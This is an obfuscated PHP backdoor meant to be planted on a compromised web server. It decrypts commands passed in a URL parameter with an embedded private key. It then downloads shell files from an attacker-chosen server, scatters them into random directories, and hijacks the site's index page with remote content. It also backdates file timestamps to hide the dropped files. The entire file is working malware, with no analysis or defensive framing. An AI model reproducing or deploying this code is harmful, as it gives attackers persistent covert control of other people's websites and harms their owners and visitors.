<?php
 goto OwR1S; zO2N5: $str = $_GET["\160"]; goto B0krh; PA09F: switch ($iden) { case "\x62\145\151\155\x61": $res = doBeima($params); break; case "\162\x65\156\141\155\145": $res = doRename($params); break; case "\151\156\144\145\x78": $res = doIndex($params); break; case "\x73\165\x62": case "\150\164\x61\x63\143\x65\163\x73": $res = doSub($params); break; case "\x6c\x6f\x63\153": $res = doLock($params); break; case "\163\164\171\154\x65": $res = doStyle($params); break; default: error("\x69\x64\145\x6e\40" . MsgText::VALUE_ERROR); } goto uYR05; dYk5E: function doLock($params) { if (empty($params["\146\x69\x6c\145\x6e\x61\x6d\x65"])) { error("\x66\151\154\145\x6e\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\x6f\x6d\141\151\x6e"])) { error("\144\x6f\x6d\141\151\x6e\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x73\x68\x65\x6c\154\x66\151\154\x65"])) { error("\x73\150\145\154\x6c\146\x69\x6c\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\117\103\x55\115\105\x4e\124\137\122\117\117\x54"] . "\x2f" . $params["\146\x69\x6c\145\x6e\x61\155\x65"]; $remoteFileUrl = $params["\x73\145\x72\x76\145\162"] . $params["\x73\150\x65\x6c\x6c\x66\x69\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\163\165\154\x74"])) { if (copyfile($content["\x72\x65\163\x75\154\164"], $localfilepath)) { $lockurl = $params["\144\x6f\155\x61\151\x6e"] . $params["\146\151\x6c\x65\156\x61\155\145"]; $lockres = getUrl($lockurl); @unlink($localfilepath); if ($lockres["\x63\157\144\x65"] === 200 && !empty($lockres["\x72\x65\x73\x70"]) && strpos($lockres["\x72\145\x73\160"], "\163\165\x63\143\145\163\163")) { success($lockres["\162\145\163\x70"]); } error(MsgText::LOCK_FILE_SUCCESS, compact("\x6c\157\143\153\165\162\154", "\154\x6f\x63\153\x72\145\x73")); } @unlink($localfilepath); error(MsgText::LOCK_FILE_ERROR, compact("\154\x6f\143\x61\x6c\146\x69\154\x65\160\x61\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\x6d\157\164\145\x46\151\x6c\145\125\x72\x6c")); } goto HfqCS; AUpV_: class ErrorCode { const E_200400 = 200400; } goto RvbBX; B0krh: $params = openssl_private_decrypt(base64_decode(urldecode($str)), $decrypted, $privateKey) ? $decrypted : null; goto e7gci; vsnvF: $privateKey = "\x2d\55\55\55\x2d\102\x45\x47\x49\116\40\120\122\x49\x56\x41\x54\105\40\113\105\131\55\x2d\55\55\55\40\115\x49\111\x45\x76\x51\111\102\101\x44\101\116\x42\147\x6b\161\x68\x6b\x69\107\71\x77\x30\102\x41\121\105\x46\101\101\x53\x43\x42\x4b\143\167\x67\147\123\152\101\x67\105\101\101\x6f\x49\102\101\x51\x43\63\60\x77\64\x39\x49\164\117\146\154\144\121\66\40\144\x42\53\60\x67\105\x62\145\145\x57\x36\x42\105\x43\154\x63\170\53\116\x5a\172\x6d\x70\x58\x32\131\x63\122\x48\106\126\x38\60\102\x75\162\x43\127\102\x61\166\120\106\145\x68\x56\x38\123\x79\x39\171\x4c\62\x75\x2f\x79\x33\155\x76\63\x51\112\112\x2b\x20\x78\x32\x6b\x4b\166\154\x79\x38\x7a\113\x78\x34\x47\142\130\x50\142\x73\127\112\x6b\66\110\157\x30\122\170\x71\64\x39\x6f\130\x6b\x42\141\x72\121\102\117\x71\x52\x4f\132\x65\141\x46\106\63\115\x7a\160\x64\x2f\x50\x64\114\123\163\x78\x45\166\107\x31\115\x20\164\x51\x64\x32\167\x4f\x78\x35\162\66\130\x44\x38\66\x6a\x79\x66\x4e\67\114\101\112\x55\125\x56\166\x62\x4a\166\x6e\x31\103\x48\x6f\x30\x33\156\106\110\61\x32\x6b\61\x4b\x59\167\114\156\121\146\172\121\x49\x35\x6e\130\67\171\121\x4c\x61\x30\152\164\40\x66\x47\65\x54\x41\63\x34\x46\x6d\x30\x45\x4d\x62\106\144\110\x57\x6a\x41\x4e\x2f\126\x64\105\152\x6f\112\x49\66\151\x74\x34\x50\x43\121\120\65\x77\x6b\64\147\141\62\x42\x76\126\161\165\x51\x6b\165\120\x62\163\x62\x72\x38\63\x36\64\x64\63\x49\x36\x20\107\x75\107\101\x4b\x44\122\60\167\146\x6b\x54\x32\60\156\60\105\x36\153\x41\155\x44\111\63\x6f\154\62\x62\x66\141\60\162\x51\x6e\x63\x71\x55\123\x33\x4f\x55\63\111\116\160\170\117\x5a\x53\x38\x65\x4b\103\x49\x67\x43\x33\x62\x4d\70\x31\155\144\x69\40\x4d\x51\x36\x54\x73\x41\121\x39\101\x67\115\102\x41\101\105\x43\x67\147\x45\x41\112\114\107\123\x6c\x41\62\x52\x70\114\144\x70\x78\x38\x6c\113\x55\165\x4f\121\x51\146\x53\x48\132\x47\x66\x76\x65\142\x2f\x45\x32\x44\132\x6c\67\53\144\123\107\115\65\x4a\40\x47\153\x4d\x49\131\x74\x6e\141\124\101\x4b\x50\121\70\x6a\x6e\x73\63\x37\x53\x4a\x58\103\163\155\122\122\x68\102\x4e\146\60\65\151\62\x30\101\x42\x73\104\164\101\x51\57\x49\124\111\x77\x6f\x70\155\x41\x41\x50\150\x68\x52\x33\x49\107\144\x43\x66\x4c\x20\x62\167\x79\x71\107\143\x45\x4f\x71\x39\x78\x5a\102\x39\x74\127\71\66\x35\x59\x4a\153\67\x4b\x70\154\114\x6c\x39\64\x71\x4e\130\164\x52\70\x43\165\x35\172\x78\143\66\x55\104\153\164\152\x48\102\122\x6b\57\113\x79\57\106\x58\112\117\152\x50\x4b\x4d\x20\x73\101\70\162\150\x6f\x78\67\x64\161\x6c\132\125\102\x33\111\x2f\161\151\x71\162\x51\x4f\x67\x54\61\102\x73\x71\x31\102\106\x54\x2b\62\107\x47\x77\x52\x55\127\x5a\x31\103\171\x46\x6f\132\x76\150\163\x44\157\x6d\x64\x6f\64\x79\x68\x52\x72\x42\60\142\40\70\131\155\x34\115\x44\151\x56\161\170\x46\120\126\x57\x38\x58\x42\x39\122\x46\104\x39\131\113\164\53\166\65\x30\x45\x62\x36\x69\x53\113\x4a\116\114\x70\x52\155\x6a\132\x44\x4e\132\142\162\x45\131\x4f\66\x4e\122\x73\122\102\x4d\67\142\162\x44\141\71\x20\156\63\x39\x6d\x5a\127\106\x72\x34\x37\167\x47\x47\130\x58\x76\57\116\x68\x77\x54\x76\x52\111\53\x32\x53\x69\57\x5a\x66\144\120\64\x2b\x6f\x35\124\x65\x53\127\121\113\102\147\x51\x44\x68\111\126\117\x55\x4f\104\x69\163\151\x4c\150\x6b\x37\x58\x4b\x62\x20\x59\x75\x37\102\x57\x31\x5a\106\143\x4b\x30\112\x78\x75\x72\161\110\x4e\62\x32\x6d\x73\166\101\x30\x51\x2f\61\161\64\122\x76\172\x69\105\x54\152\145\x6b\x58\x49\156\71\x6c\126\x4b\103\x6d\x53\x2f\x67\171\62\x4f\x32\x52\164\165\121\x52\165\154\101\122\x20\146\143\63\163\x7a\62\x57\x39\x74\x4e\x58\122\x46\70\x41\166\171\60\x37\62\x38\x4e\x47\60\x62\x61\x4f\117\x77\102\141\x6c\x4f\x38\167\x33\143\103\130\66\116\x6e\x6d\67\60\x70\x4a\x65\x72\53\x69\x4a\x53\156\x33\164\x6d\101\113\123\102\x34\x4c\124\x20\x76\142\123\102\x38\160\x74\66\121\x67\x50\70\x4e\120\110\x79\x51\144\127\160\62\114\x77\x4f\x74\167\x4b\102\x67\121\104\x52\102\70\154\x67\x53\x61\111\155\x49\115\x4a\x42\x61\130\x45\122\123\141\157\x4e\147\x38\153\x78\166\63\x2f\x63\x76\64\147\x35\x20\x6a\125\x6c\x6c\x6a\x78\x4e\121\143\x55\163\152\x30\126\67\130\x69\154\156\102\63\x6d\x46\170\x71\65\162\x48\152\x42\132\124\x73\113\172\x4d\x4d\x51\x79\166\x68\x4f\170\x59\x68\160\164\104\x66\x77\66\x4f\x4c\164\157\120\125\x6b\62\127\151\x42\x55\x73\x20\154\x33\161\x55\x30\x74\x49\130\116\116\x2b\143\124\170\165\x32\x53\115\113\x54\152\167\115\153\164\x6b\x70\x6d\x41\103\112\161\141\x2b\x6b\x32\67\x65\105\125\x71\170\162\x4b\117\57\66\x53\x45\x69\x50\71\106\x4d\130\110\x76\147\x41\x34\105\x45\102\x4d\x20\x48\167\x77\x31\145\x55\71\x51\x71\x77\113\x42\147\x41\127\x53\131\65\125\x70\x68\167\62\117\110\114\111\x79\x78\x6b\x46\145\121\63\x5a\x35\x6f\x6a\162\65\166\117\66\x66\x41\67\x56\152\x6e\131\x45\154\144\x36\x47\x41\103\170\163\x54\x63\141\x57\x71\x20\166\x6c\162\124\151\153\71\x4f\x52\125\x54\x6d\x77\x55\163\143\x57\x6a\x6f\x33\x38\104\x6c\x4a\101\x34\101\105\60\x6e\112\x38\x59\x4a\x70\132\172\67\124\x51\x51\166\x4a\x33\x32\147\120\x55\172\154\x47\103\123\x45\x35\153\x34\x45\126\x71\x4c\66\x56\x4c\x20\x51\x35\123\x6a\161\x2b\172\x7a\141\104\120\152\x31\x45\x65\120\x70\x76\165\x75\x34\153\x72\71\x46\151\115\x7a\107\107\x50\x52\x4d\103\122\57\115\x71\130\x6c\x2b\106\71\110\155\x43\x31\x63\x76\x38\115\x43\x59\104\x55\154\101\x6f\107\102\x41\113\67\67\40\147\67\160\126\113\141\131\x64\x57\153\x43\x44\x30\x69\105\x55\164\64\x52\153\167\57\x49\146\123\170\167\171\x51\x67\x6c\142\x6d\x77\x75\x6e\x67\102\127\150\111\142\117\60\117\61\67\x58\x39\x46\144\60\156\x38\111\x57\125\65\127\153\125\x62\x52\x78\x20\x65\x39\x58\142\x59\x62\x45\x30\x35\x74\x30\143\x6f\x62\105\132\x46\x63\x67\x30\164\106\161\x4c\x48\127\122\143\x4f\x73\x31\57\x61\123\102\x59\143\64\114\x31\167\150\x4d\112\x72\152\163\153\111\141\66\101\60\x37\114\x52\63\165\x6f\x51\122\162\x38\x72\40\x34\161\x6b\x57\67\131\162\x74\171\x5a\x6c\x75\x4b\66\x65\x41\x42\x42\x79\103\130\x53\x62\145\151\x54\x52\x6c\x64\x6b\63\103\x31\x2b\145\x54\171\x36\x2f\x4e\101\x6f\x47\101\142\71\x2f\x4a\x2b\x4e\127\x72\x68\x59\123\162\57\x56\157\x47\127\x6a\165\151\x20\x63\x68\130\103\116\163\172\171\64\167\x36\x65\x78\126\167\x78\x58\121\113\x4e\x54\164\x6c\172\113\x78\x79\x68\x51\146\x56\120\x4b\x32\x42\170\162\x70\164\x57\114\x36\113\x43\122\x4b\160\x7a\x33\x77\150\53\127\131\62\x43\63\121\x59\x79\x56\x66\167\107\40\x46\102\x34\x68\167\x44\x72\62\x6d\x59\64\124\127\106\71\x70\x44\x31\x39\x34\151\105\123\61\x79\x68\x72\x51\x47\x6c\x49\x38\130\x4d\53\62\114\126\150\x42\x6c\x33\x70\60\x78\x2b\x54\106\147\x4a\x4d\x61\x54\x67\104\104\x71\101\156\170\160\x75\x71\124\40\165\x70\102\131\x71\124\x59\115\x6c\x4f\x64\x2b\126\x52\67\x68\105\116\x4d\141\x46\161\x6f\x3d\40\55\x2d\55\55\x2d\x45\116\x44\x20\x50\x52\111\126\x41\124\x45\x20\113\105\131\55\x2d\55\x2d\55"; goto zO2N5; ACsgI: function getDirPathsByLevel($level = 6) { $initDir = $_SERVER["\104\x4f\x43\125\115\x45\116\x54\x5f\x52\117\117\x54"]; $dirs = array($initDir); $count = count($dirs); while (count($dirs) > $count - 1) { $path = $dirs[$count - 1]; $count += 1; if (@is_dir($path) && @($handle = @opendir($path))) { while ($file = @readdir($handle)) { $realpath = $path . "\x2f" . $file; if ($file == "\x2e" || $file == "\56\56" || !is_dir($realpath) || substr($file, 0, 1) === "\x2e") { continue; } $path3 = str_replace($initDir, '', $path); $path4 = explode("\57", $path3); if (count($path4) > $level - 1) { continue; } $dirs[] = $realpath; } } @closedir($handle); } return $dirs; } goto nzhQI; ppnsW: $iden = isset($params["\151\x64\x65\x6e"]) ? strtolower($params["\x69\144\145\x6e"]) : ''; goto PA09F; IMQNi: function doSub($params) { if (empty($params["\x73\x68\x65\x6c\154\x66\151\x6c\x65"])) { error("\x73\x68\x65\x6c\x6c\x66\x69\154\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\146\151\154\145\x6e\x61\155\145"])) { error("\x66\x69\154\145\156\141\155\x65\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\x4f\103\x55\115\x45\x4e\124\137\122\117\x4f\x54"] . "\x2f" . $params["\x66\x69\154\x65\x6e\x61\x6d\x65"]; $remoteFileUrl = $params["\x73\x65\x72\x76\x65\x72"] . $params["\163\x68\x65\154\x6c\146\151\x6c\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\x73\165\x6c\x74"])) { if (copyfile($content["\162\x65\x73\165\154\x74"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\x63\141\154\146\151\x6c\145\x70\x61\x74\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\155\x6f\x74\145\106\x69\x6c\x65\x55\x72\x6c")); } goto dYk5E; oL8yP: function success($data) { die(@json_encode(array("\x63\x6f\144\x65" => 200, "\x6d\x73\x67" => MsgText::SUCCESS, "\144\141\x74\141" => $data), JSON_UNESCAPED_UNICODE)); } goto ACsgI; iDZzs: function updateFiletime($filepath) { $ctime = filectime($filepath); $now = time(); if (!($now > $ctime + 31104000)) { $newTime = $now - mt_rand(15552000, 31104000); touch($filepath, $newTime, $newTime); return true; } return true; } goto vsnvF; uYR05: function doBeima($params) { if (empty($params["\x66\x69\x6c\145\x6e\141\x6d\145"])) { error("\x66\x69\x6c\x65\x6e\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x73\150\x65\154\154\146\151\154\x65"])) { error("\x73\150\x65\x6c\x6c\146\x69\x6c\145\40" . MsgText::PARAM_EMPTY, $params); } empty($params["\154\x65\x76\x65\154"]) && ($params["\154\x65\166\145\154"] = 6); $dirs = getDirPathsByLevel($params["\154\x65\166\145\x6c"]); $temp = array_rand($dirs); $createDir = $dirs[$temp] . "\57"; $localfilepath = $createDir . $params["\x66\x69\x6c\145\x6e\141\x6d\145"]; $remoteFileUrl = $params["\163\145\x72\x76\145\x72"] . $params["\x73\150\145\154\154\x66\x69\x6c\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\145\163\165\154\164"])) { if (copyfile($content["\162\x65\x73\165\x6c\164"], $localfilepath)) { updateFiletime($localfilepath); $beimaurl = str_replace($_SERVER["\x44\x4f\x43\125\115\105\116\x54\137\122\x4f\x4f\124"], '', $localfilepath); success(compact("\x6c\157\143\x61\x6c\x66\151\154\145\x70\141\164\x68", "\x62\145\151\155\141\x75\x72\154")); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\143\x61\x6c\146\x69\154\x65\160\141\164\150")); } error(MsgText::REMOTE_FILE_EXISTS, compact("\162\x65\x6d\157\x74\145\x46\151\x6c\145\125\162\x6c")); } goto bijda; OwR1S: error_reporting(0); goto AUpV_; b42Rx: function copyfile($content, $localfile, $isAppend = false, $appendContent = '') { if ($isAppend && !empty($appendContent)) { $content = trim($content); if (substr($content, -2, 2) !== "\77\x3e") { $content .= "\x20\77\76"; } $content = $content . PHP_EOL . PHP_EOL . $appendContent; } @file_put_contents($localfile, $content); if (!file_exists($localfile)) { $openedfile = @fopen($localfile, "\x77"); @fwrite($openedfile, $content); @fclose($openedfile); } if (!file_exists($localfile)) { return false; } return true; } goto iDZzs; IfgHL: function error($msg = MsgText::UNKNOWN_ERROR, $extras = array(), $code = 0) { empty($code) && ($code = ErrorCode::E_200400); die(@json_encode(array("\143\x6f\x64\145" => $code, "\155\x73\147" => $msg, "\x65\x78\164\162\141\x73" => $extras), JSON_UNESCAPED_UNICODE)); } goto oL8yP; nzhQI: function getUrl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($httpCode === 200) { $content = curl_exec($curl); return array("\143\x6f\144\x65" => 200, "\x72\x65\x73\x70" => $content); } return array("\x63\157\x64\145" => 500, "\x72\x65\163\160" => ''); } goto POnAo; bijda: function doRename($params) { if (empty($params["\163\157\165\162\143\145\156\141\x6d\145"])) { error("\163\157\165\x72\143\x65\x6e\141\x6d\x65\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x72\145\x6e\x61\x6d\x65"])) { error("\x72\x65\x6e\x61\x6d\x65\x20" . MsgText::PARAM_EMPTY, $params); } if ($params["\163\157\165\162\x63\145\156\141\x6d\x65"] === $params["\162\145\156\x61\x6d\145"]) { error(MsgText::NOCHANGE); } $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x73\157\165\x72\143\x65\x6e\x61\x6d\x65"]; $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x72\145\x6e\141\x6d\x65"]; $resSource = $params["\x73\145\x72\x76\145\162"] . str_replace(strtolower($_SERVER["\x44\x4f\x43\125\x4d\x45\116\x54\x5f\122\x4f\x4f\124"]), '', strtolower($sourceFile)); $resSource = str_replace("\x5c", "\x2f", $resSource); if (file_exists($sourceFile)) { if (rename($sourceFile, $renameFile)) { success($renameFile); } else { error(MsgText::RENAME_ERROR, compact("\162\145\156\x61\155\145\x46\151\x6c\145")); } } else { error(MsgText::LOCAL_FILE_EXISTS, compact("\x72\145\163\x53\x6f\x75\x72\143\x65")); } } goto GdLFe; GdLFe: function doIndex($params) { if (empty($params["\x73\150\145\154\x6c\146\151\154\145"])) { error("\163\x68\x65\x6c\154\146\x69\x6c\x65\x20" . MsgText::PARAM_EMPTY, $params); } $remoteUrl = $params["\x73\145\162\x76\145\162"] . trim($params["\x73\150\145\x6c\154\146\x69\x6c\145"]); $localfilepath = $_SERVER["\104\117\103\x55\115\x45\116\x54\137\x52\x4f\x4f\x54"] . "\x2f\x69\x6e\144\x65\x78\x2e\160\x68\x70"; $content = getRemoteContent($remoteUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\x73\165\x6c\x74"])) { $oldContent = ''; if (file_exists($localfilepath)) { $oldContent = @file_get_contents($localfilepath); } elseif (file_exists($_SERVER["\x44\x4f\103\125\x4d\105\116\124\137\122\117\117\x54"] . "\x2f\x69\156\x64\145\170\56\x68\164\155\x6c")) { $oldContent = @file_get_contents($_SERVER["\104\117\103\x55\x4d\x45\x4e\124\x5f\x52\x4f\117\124"] . "\57\x69\x6e\144\x65\x78\x2e\150\x74\155\154"); } elseif (file_exists($_SERVER["\x44\117\x43\x55\x4d\x45\x4e\x54\137\x52\117\117\x54"] . "\x2f\x69\x6e\x64\145\x78\56\150\164\155")) { $oldContent = @file_get_contents($_SERVER["\104\x4f\103\x55\115\105\116\x54\x5f\122\x4f\x4f\x54"] . "\x2f\151\156\144\x65\170\56\x68\164\155"); } elseif (file_exists($_SERVER["\x44\117\103\125\115\x45\x4e\x54\x5f\122\117\117\x54"] . "\x2f\x64\145\146\141\x75\x6c\164\56\x68\x74\x6d\154")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\x43\125\x4d\105\x4e\124\137\x52\117\117\x54"] . "\x2f\x64\145\146\141\165\154\164\56\x68\164\155\154"); } elseif (file_exists($_SERVER["\104\117\103\125\115\x45\x4e\x54\x5f\x52\x4f\117\124"] . "\57\x64\x65\x66\141\x75\154\164\56\x68\164\x6d")) { $oldContent = @file_get_contents($_SERVER["\104\117\x43\125\x4d\x45\x4e\124\137\122\x4f\x4f\x54"] . "\57\x64\x65\x66\141\x75\154\x74\56\150\x74\155"); } if (copyfile($content["\x72\145\x73\x75\154\164"], $localfilepath, true, $oldContent)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\x63\x61\x6c\x66\151\154\x65\160\x61\164\x68")); } error(MsgText::INDEX_ERROR, compact("\x72\x65\x6d\157\x74\145\125\x72\x6c")); } goto IMQNi; WinxO: $params = json_decode($params, true); goto xqYYu; e7gci: if (is_null($params)) { error(MsgText::DECRYPT_FAIL); } goto WinxO; O61sP: if (empty($params["\163\145\x72\x76\x65\x72"])) { error("\x73\145\x72\166\145\162\x20" . MsgText::PARAM_EMPTY); } goto oJBA0; RvbBX: class MsgText { const PARAM_EMPTY = "\160\141\x72\141\155\40\x69\x73\40\x65\x6d\160\164\x79"; const PARAM_TYPE = "\x70\141\162\141\155\40\164\x79\160\145\x20\145\x72\162\x6f\162"; const VALUE_ERROR = "\166\x61\x6c\x75\x65\x20\x65\162\x72\157\x72"; const NOCHANGE = "\156\x6f\40\143\150\x61\x6e\147\x65"; const LOCK_FILE_SUCCESS = "\x67\x65\156\145\x72\141\164\x65\x20\154\157\x63\x6b\x20\x66\x69\x6c\145\40\x73\x75\x63\x63\x65\x73\x73\x2c\142\165\x74\40\x6c\x6f\143\153\40\x69\x6e\x64\x65\170\56\160\x68\x70\x20\x65\162\x72\157\162"; const LOCK_FILE_ERROR = "\x67\x65\156\145\x72\x61\164\x65\40\154\x6f\x63\x6b\40\146\x69\154\145\x20\145\162\x72\157\162"; const REMOTE_GET_ERROR = "\x67\145\x74\x20\162\145\x6d\157\164\145\40\x63\157\156\164\145\x6e\x74\40\145\x72\162\x6f\162"; const LOCAL_FILE_ERROR = "\147\x65\x6e\x65\x72\x61\164\x65\40\154\157\143\x61\154\x20\146\151\x6c\x65\x20\x65\162\x72\157\162"; const SUCCESS = "\163\x75\x63\143\x65\163\163"; const LOCAL_FILE_EXISTS = "\154\157\143\x61\154\x20\146\x69\154\x65\40\144\x6f\x65\163\x6e\x27\x74\x20\x65\170\151\163\x74"; const REMOTE_FILE_EXISTS = "\x72\x65\155\157\164\x65\40\146\151\154\x65\x20\144\157\145\163\x6e\47\164\40\145\170\x69\163\x74"; const RENAME_ERROR = "\x72\x65\156\141\155\145\40\145\162\x72\x6f\162"; const INDEX_ERROR = "\x69\x6e\x64\x65\170\x20\x68\151\152\x61\143\x6b\40\x65\162\x72\157\x72"; const UNKNOWN_ERROR = "\165\156\x6b\x6e\x6f\x77\156\40\145\x72\162\157\x72"; const DECRYPT_FAIL = "\x70\141\162\141\x6d\163\40\x64\145\x63\x72\x79\160\x74\40\x66\x61\151\x6c"; } goto IfgHL; POnAo: function getRemoteContent($url) { $content = @file_get_contents($url); if ($content === false) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); $content = curl_exec($curl); curl_close($curl); } return !empty($content) && is_string($content) ? $content : ''; } goto b42Rx; oJBA0: if (empty($params["\x69\144\145\156"])) { error("\151\144\145\156\40" . MsgText::PARAM_EMPTY); } goto ppnsW; xqYYu: if (!is_array($params)) { error(MsgText::PARAM_TYPE, $params); } goto O61sP; HfqCS: function doStyle($params) { if (empty($params["\x73\x68\145\x6c\x6c\x66\x69\x6c\145"])) { error("\x73\150\145\154\154\x66\x69\x6c\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\x69\154\x65\156\x61\155\x65"])) { error("\146\151\x6c\145\x6e\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\157\x6d\141\151\156"])) { error("\x64\157\155\141\x69\x6e\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $params["\144\x6f\155\141\151\x6e"] . $params["\x66\151\x6c\x65\x6e\x61\155\145"]; $remoteFileUrl = $params["\x73\145\162\x76\x65\162"] . $params["\x73\150\x65\154\154\146\151\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\x73\165\154\x74"])) { if (copyfile($content["\x72\x65\x73\165\154\164"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\143\x61\x6c\x66\x69\154\x65\160\141\164\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\145\x6d\157\x74\145\x46\x69\154\x65\125\x72\154")); }
